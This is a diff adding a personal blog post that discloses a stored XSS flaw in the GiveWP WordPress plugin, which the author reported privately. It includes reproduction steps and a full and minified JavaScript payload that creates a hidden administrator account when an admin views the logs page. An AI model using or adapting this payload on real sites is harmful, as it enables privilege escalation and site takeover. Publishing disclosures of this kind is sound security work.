@@ -1,0 +1,205 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+  <meta charset="utf-8">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+
+  <title>Vulnerability Report - WordPress plugin - givewp</title>
+  <meta name="description" content="This is a post I back dated to when I privately reported a vulnerability to givewp for their WordPress plugin. I privately shared via their support contact f...">
+  <link href="https://fonts.googleapis.com/css?family=Heebo:400,700,900" rel="stylesheet">
+  <link rel="stylesheet" href="/assets/main.css?h=b1eeb49%0A">
+  <link rel="canonical" href="http://ahermosilla.com/security/2017/11/27/vuln-givewp.html">
+  <link rel="alternate" type="application/rss+xml" title="Andres Hermosilla | brain --archive" href="/feed.xml">
+  
+  
+  <script>
+  (function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
+  (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
+  m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
+  })(window,document,'script','https://www.google-analytics.com/analytics.js','ga');
+
+  ga('create', 'UA-33398574-1', 'auto');
+  ga('send', 'pageview');
+
+</script>
+  
+
+  
+</head>
+  <body>
+    <header class="site-header" role="banner">
+  <div class="wrapper">
+    <span class="post-path">
+      <a href="/">2017-11-27-vuln-givewp.md</a>
+    </span>
+    <nav class="site-nav">
+      <a class="menu-trigger">Menu</a>
+      <div class="menu-items">
+        
+          <a class="page-link" href="/">/root</a>
+        
+          <a class="page-link" href="/about/">/about</a>
+        
+          <a class="page-link" href="/projects/">/projects</a>
+        
+          <a class="page-link" href="/tags/">/tags</a>
+        
+      </div>
+    </nav>
+  </div>
+</header>
+
+    <main class="page-content">
+      <div class="wrapper" aria-label="Content">
+        <article id="post-vuln-givewp" class="post post-single category-securitytag-vulnerability" itemscope itemtype="http://schema.org/BlogPosting">
+  <header class="post-header">
+    <h1 class="post-title" itemprop="name headline">Vulnerability Report - WordPress plugin - givewp</h1>
+    <section class="post-meta">
+      
+      <time class="post-date" datetime="2017-11-27T00:00:00+00:00" itemprop="datePublished">
+        November 27, 2017
+      </time>
+
+
+
+      
+        
+
+
+<ul class="tag-links topic-links">
+	
+	
+    <li class="tag-link-item"><a href="/tags/vulnerability/">vulnerability</a></li>
+    
+</ul>
+      
+    </section>
+  </header>
+  <section class="post-content" itemprop="articleBody">
+    
+    <p>This is a post I back dated to when I privately reported a vulnerability to givewp for their WordPress plugin. I privately shared via their support contact form. The version this XSS was found is long in the past!</p>
+
+<blockquote>
+  <p>I discovered an XSS vulnerability, details included in Vulnerability input.
+If you have any questions or need more information please let me know! I wasn’t sure how to do a ‘private pull request’ otherwise I would have done that.</p>
+</blockquote>
+
+<h2 id="problem">Problem</h2>
+<p>There is an Authenticated, Stored XSS that allows lower privileges users to craft an XSS payload in the form title that would enable them to create an administrator user they can login with. For the proof of concept, I created a user with the <em>Give Worker</em> role and created an admin user via the XSS.</p>
+
+<h2 id="problem-source">Problem source</h2>
+<p>I can’t find the original version of the source code, but here is the reference.
+https://github.com/WordImpress/Give/blob/release/1.8.17/includes/admin/tools/logs/class-sales-logs-list-table.php#L75Raw</p>
+
+<h2 id="steps-to-reproduce">Steps to reproduce</h2>
+<ul>
+  <li>1 - Add user with Give Worker role</li>
+  <li>2 - Login to that user account or switch to that user using User Switching plugin</li>
+  <li>3 - Add donation form at Give &gt; Add Form (/wp-admin/post-new.php?post_type=give_forms)</li>
+  <li>4 - For form title use the minifiied title with script tags found here</li>
+</ul>
+
+<div class="language-javascript highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nx">u5</span><span class="o">=</span><span class="dl">'</span><span class="s1">/wp-admin/user-new.php</span><span class="dl">'</span>
+<span class="nx">u8</span><span class="o">=</span> <span class="dl">"</span><span class="s2">same-origin</span><span class="dl">"</span>
+<span class="nf">fetch</span><span class="p">(</span><span class="nx">u5</span><span class="p">,{</span><span class="na">credentials</span><span class="p">:</span> <span class="nx">u8</span><span class="p">}).</span><span class="nf">then</span><span class="p">(</span><span class="kd">function</span><span class="p">(</span><span class="nx">r</span><span class="p">)</span> <span class="p">{</span>
+  <span class="nx">n</span><span class="o">=</span><span class="p">{}</span>
+  <span class="nx">fd</span><span class="o">=</span><span class="k">new</span> <span class="nc">FormData</span><span class="p">();</span>
+  <span class="c1">// Create an admin user via XSS</span>
+  <span class="nx">r</span><span class="p">.</span><span class="nf">text</span><span class="p">().</span><span class="nf">then</span><span class="p">(</span><span class="kd">function</span><span class="p">(</span><span class="nx">t</span><span class="p">){</span>
+    <span class="nx">m</span> <span class="o">=</span> <span class="sr">/_wpnonce_create-user" value="</span><span class="se">([^</span><span class="sr">"</span><span class="se">]</span><span class="sr">*</span><span class="se">?)</span><span class="sr">"/</span><span class="p">.</span><span class="nf">exec</span><span class="p">(</span><span class="nx">t</span><span class="p">);</span>
+    <span class="nx">n</span><span class="p">[</span><span class="dl">'</span><span class="s1">_wpnonce_create-user</span><span class="dl">'</span><span class="p">]</span> <span class="o">=</span> <span class="nx">m</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span>
+    <span class="nx">n</span><span class="p">.</span><span class="nx">action</span> <span class="o">=</span> <span class="dl">'</span><span class="s1">createuser</span><span class="dl">'</span><span class="p">;</span>
+    <span class="nx">n</span><span class="p">.</span><span class="nx">pass1</span><span class="o">=</span><span class="dl">'</span><span class="s1">pass9999999999</span><span class="dl">'</span><span class="p">;</span>
+    <span class="nx">n</span><span class="p">.</span><span class="nx">pass2</span><span class="o">=</span><span class="dl">'</span><span class="s1">pass9999999999</span><span class="dl">'</span><span class="p">;</span>
+    <span class="nx">n</span><span class="p">.</span><span class="nx">user_login</span><span class="o">=</span><span class="dl">'</span><span class="s1">test4565465</span><span class="dl">'</span><span class="p">;</span>
+    <span class="nx">n</span><span class="p">.</span><span class="nx">email</span><span class="o">=</span><span class="dl">'</span><span class="s1">waiting@email.com</span><span class="dl">'</span><span class="p">;</span>
+    <span class="nx">n</span><span class="p">.</span><span class="nx">role</span><span class="o">=</span><span class="dl">'</span><span class="s1">administrator</span><span class="dl">'</span><span class="p">;</span>
+    <span class="nx">n</span><span class="p">.</span><span class="nx">_wp_http_referer</span><span class="o">=</span><span class="nx">u5</span><span class="p">;</span>
+
+    <span class="k">for </span><span class="p">(</span><span class="kd">var</span> <span class="nx">k</span> <span class="k">in</span> <span class="nx">n</span><span class="p">)</span> <span class="p">{</span>
+      <span class="nx">fd</span><span class="p">.</span><span class="nf">append</span><span class="p">(</span><span class="nx">k</span><span class="p">,</span> <span class="nx">n</span><span class="p">[</span><span class="nx">k</span><span class="p">]);</span>
+    <span class="p">}</span>
+
+    <span class="nf">fetch</span><span class="p">(</span><span class="nx">u5</span><span class="p">,</span> <span class="p">{</span>
+      <span class="na">method</span><span class="p">:</span> <span class="dl">'</span><span class="s1">post</span><span class="dl">'</span><span class="p">,</span>
+      <span class="na">body</span><span class="p">:</span> <span class="nx">fd</span><span class="p">,</span>
+      <span class="na">credentials</span><span class="p">:</span><span class="nx">u8</span>
+    <span class="p">});</span>
+  <span class="p">});</span>
+<span class="p">});</span>
+</code></pre></div></div>
+<p><strong>minified version</strong></p>
+<div class="language-javascript highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">// &lt;script&gt;u5="/wp-admin/user-new.php",u8="same-origin",fetch(u5,{credentials:u8}).then(function(e){n={},fd=new FormData,e.text().then(function(e){m=/_wpnonce_create-user" value="([^"]*?)"/.exec(e),n["_wpnonce_create-user"]=m[1],n.action="createuser",n.pass1="pass9999999999",n.pass2="pass9999999999",n.user_login="test4565465",n.email="waiting@email.com",n.role="administrator",n._wp_http_referer=u5;for(var t in n)fd.append(t,n[t]);fetch(u5,{method:"post",body:fd,credentials:u8})})});&lt;/script&gt;</span>
+</code></pre></div></div>
+
+<p>https://gist.github.com/rezen/df6d132e2336424e9b3668ed7c5947a5</p>
+<ul>
+  <li>5 - Switch to administrator user</li>
+  <li>6 - With an administrator account, go to Give &gt; Tools &gt; Logs (tab) (/wp-admin/edit.php?post_type=give_forms&amp;page=give-tools&amp;tab=logs)</li>
+  <li>7 - Go observe new user added Users &gt; All Users (/wp-admin/users.php)</li>
+</ul>
+
+<h2 id="tested-on">Tested on</h2>
+<ul>
+  <li>WP Version: 4.8</li>
+  <li>PHP Version: 5.6.30</li>
+  <li>Plugin Version: 1.8.16</li>
+  <li>Browser: Chrome 58</li>
+</ul>
+
+  </section>
+
+  
+</article>
+      </div>
+    </main>
+    <footer id="site-footer">
+  <div class="wrapper">
+
+    <div class="footer-col-wrapper">
+      <div class="footer-col footer-col-1"></div>
+
+      <div class="footer-col footer-col-2">
+        <ul class="social-media-list">
+          
+          <li>
+            <a href="https://github.com/rezen"><span class="icon icon--github"><svg viewBox="0 0 16 16" width="16px" height="16px"><path fill="#828282" d="M7.999,0.431c-4.285,0-7.76,3.474-7.76,7.761 c0,3.428,2.223,6.337,5.307,7.363c0.388,0.071,0.53-0.168,0.53-0.374c0-0.184-0.007-0.672-0.01-1.32 c-2.159,0.469-2.614-1.04-2.614-1.04c-0.353-0.896-0.862-1.135-0.862-1.135c-0.705-0.481,0.053-0.472,0.053-0.472 c0.779,0.055,1.189,0.8,1.189,0.8c0.692,1.186,1.816,0.843,2.258,0.645c0.071-0.502,0.271-0.843,0.493-1.037 C4.86,11.425,3.049,10.76,3.049,7.786c0-0.847,0.302-1.54,0.799-2.082C3.768,5.507,3.501,4.718,3.924,3.65 c0,0,0.652-0.209,2.134,0.796C6.677,4.273,7.34,4.187,8,4.184c0.659,0.003,1.323,0.089,1.943,0.261 c1.482-1.004,2.132-0.796,2.132-0.796c0.423,1.068,0.157,1.857,0.077,2.054c0.497,0.542,0.798,1.235,0.798,2.082 c0,2.981-1.814,3.637-3.543,3.829c0.279,0.24,0.527,0.713,0.527,1.437c0,1.037-0.01,1.874-0.01,2.129 c0,0.208,0.14,0.449,0.534,0.373c3.081-1.028,5.302-3.935,5.302-7.362C15.76,3.906,12.285,0.431,7.999,0.431z"/></svg>
+</span><span class="username">rezen</span></a>
+
+          </li>
+          
+
+          
+          <li>
+            <a href="https://twitter.com/dandr3ss"><span class="icon icon--twitter"><svg viewBox="0 0 16 16" width="16px" height="16px"><path fill="#828282" d="M15.969,3.058c-0.586,0.26-1.217,0.436-1.878,0.515c0.675-0.405,1.194-1.045,1.438-1.809c-0.632,0.375-1.332,0.647-2.076,0.793c-0.596-0.636-1.446-1.033-2.387-1.033c-1.806,0-3.27,1.464-3.27,3.27 c0,0.256,0.029,0.506,0.085,0.745C5.163,5.404,2.753,4.102,1.14,2.124C0.859,2.607,0.698,3.168,0.698,3.767 c0,1.134,0.577,2.135,1.455,2.722C1.616,6.472,1.112,6.325,0.671,6.08c0,0.014,0,0.027,0,0.041c0,1.584,1.127,2.906,2.623,3.206 C3.02,9.402,2.731,9.442,2.433,9.442c-0.211,0-0.416-0.021-0.615-0.059c0.416,1.299,1.624,2.245,3.055,2.271 c-1.119,0.877-2.529,1.4-4.061,1.4c-0.264,0-0.524-0.015-0.78-0.046c1.447,0.928,3.166,1.469,5.013,1.469 c6.015,0,9.304-4.983,9.304-9.304c0-0.142-0.003-0.283-0.009-0.423C14.976,4.29,15.531,3.714,15.969,3.058z"/></svg>
+</span><span class="username">dandr3ss</span></a>
+
+          </li>
+          
+        </ul>
+      </div>
+
+      <div class="footer-col footer-col-3">
+        <p>Hi there, this is where I archive some of my brain records on development and design topics I&#39;ve been working through. Some of these thoughts are raw as I&#39;m evolving and others  are refined from years of experience.
+</p>
+      </div>
+    </div>
+  </div>
+</footer>
+<script src="https://ajax.googleapis.com/ajax/libs/jquery/3.1.1/jquery.min.js"></script>
+<script>
+jQuery(function ($) {
+  // Add anchors to headings that have ids
+  // https://github.com/jekyll/jekyll/issues/2690#issuecomment-153697263
+  $('h2,h3,h4,h5,h6').filter('[id]').each(function () {
+    $(this).html('<a href="#'+$(this).attr('id')+'">' + $(this).text() + '</a>');
+  });
+
+  $('.menu-trigger').on('click', function () {
+    $(this).next().toggleClass('expanded');
+  });
+});
+</script>
+  </body>
+</html>
